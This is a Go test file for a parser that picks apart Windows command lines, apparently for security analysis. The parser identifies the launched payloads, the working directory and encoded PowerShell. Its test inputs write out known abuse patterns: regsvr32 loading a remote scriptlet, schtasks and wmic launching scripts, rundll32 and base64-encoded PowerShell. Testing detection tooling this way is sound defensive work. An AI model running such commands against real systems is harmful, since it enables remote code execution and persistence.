package commandchain

import (
	"encoding/base64"
	"encoding/binary"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf16"
)

func TestStaticExecutionChains(t *testing.T) {
	for _, tt := range []struct {
		name, command, target, dir string
		async                      bool
	}{
		{"service-chain", `cmd /c cd /d "C:\CustomRoot\alpha\beta\" && start "" "C:\CustomRoot\alpha\beta\agent.exe"`, `C:\CustomRoot\alpha\beta\agent.exe`, `C:\CustomRoot\alpha\beta`, true},
		{"relative", `cmd /c cd /d "C:\Test Folder" && start "Case Title" .\agent.exe`, `C:\Test Folder\agent.exe`, `C:\Test Folder`, true},
		{"quoted-chain", `cmd /c "C:\Test Folder\a.exe" && "C:\Test Folder\b.exe"`, `C:\Test Folder\b.exe`, "", false},
		{"wait", `cmd /c start /wait "" "C:\Test Folder\agent.exe"`, `C:\Test Folder\agent.exe`, "", false},
		{"escaped", `cmd /c sta^rt "" "C:\A&B\agent.exe"`, `C:\A&B\agent.exe`, "", true},
		{"directory-dot", `cmd /c C:\Vendor.v1 Folder\agent.exe --flag`, `C:\Vendor.v1 Folder\agent.exe`, "", false},
		{"ps-file", `powershell -NoProfile -File "C:\测试 目录\audit.ps1"`, `C:\测试 目录\audit.ps1`, "", false},
		{"dll", `rundll32.exe "C:\Test Folder\helper.dll",Entry`, `C:\Test Folder\helper.dll`, "", false},
		{"remote", `regsvr32.exe /s /n /i:https://example.invalid/check.sct scrobj.dll`, `https://example.invalid/check.sct`, "", false},
		{"task", `schtasks /create /tn Check /tr "cmd /c C:\Tests\check.cmd"`, `C:\Tests\check.cmd`, "", false},
		{"wmic", `wmic process call create "cmd /c C:\Tests\check.cmd"`, `C:\Tests\check.cmd`, "", false},
	} {
		t.Run(tt.name, func(t *testing.T) {
			chain := Parse(tt.command, Options{Resolve: func(v, dir string) string {
				if strings.Contains(v, `:\`) {
					return filepath.Clean(v)
				}
				if dir != "" {
					return filepath.Join(dir, v)
				}
				return v
			}})
			found := false
			for _, target := range chain.Payloads {
				if target.Path == tt.target {
					found = true
				}
			}
			if !found {
				t.Fatalf("target %q not found: %+v", tt.target, chain)
			}
			if chain.WorkingDirectory != tt.dir || chain.Asynchronous != tt.async {
				t.Fatalf("unexpected context: %+v", chain)
			}
		})
	}
}

func TestEncodedCommandIsDecodedWithoutEvaluation(t *testing.T) {
	script := `Start-Process -FilePath 'C:\Test Files\check.exe'`
	u := utf16.Encode([]rune(script))
	raw := make([]byte, len(u)*2)
	for i, v := range u {
		binary.LittleEndian.PutUint16(raw[i*2:], v)
	}
	chain := Parse("powershell -enc "+base64.StdEncoding.EncodeToString(raw), Options{})
	if !chain.Encoded || !chain.Asynchronous || len(chain.Payloads) == 0 {
		t.Fatalf("encoding not parsed: %+v", chain)
	}
	if chain.Payloads[0].Path != `C:\Test Files\check.exe` {
		t.Fatalf("wrong encoded target: %+v", chain)
	}
}

func TestUnresolvedDynamicPathsAndBounds(t *testing.T) {
	chain := Parse(`cmd /c start "" %OTHER_USER_HOME%\missing.exe`, Options{Resolve: func(v, dir string) string { return "" }})
	if len(chain.Payloads) != 1 || chain.Payloads[0].Kind != "unresolved" || len(chain.Warnings) == 0 {
		t.Fatalf("dynamic path was treated as a file: %+v", chain)
	}
	chain = Parse(strings.Repeat("x", maxCommandBytes+1), Options{})
	if chain.Launcher.Path != "" || len(chain.Warnings) == 0 {
		t.Fatal("oversized command was not bounded")
	}
	chain = Parse(`powershell -enc invalid!`, Options{})
	if len(chain.Warnings) == 0 {
		t.Fatal("bad encoded command did not warn")
	}
}
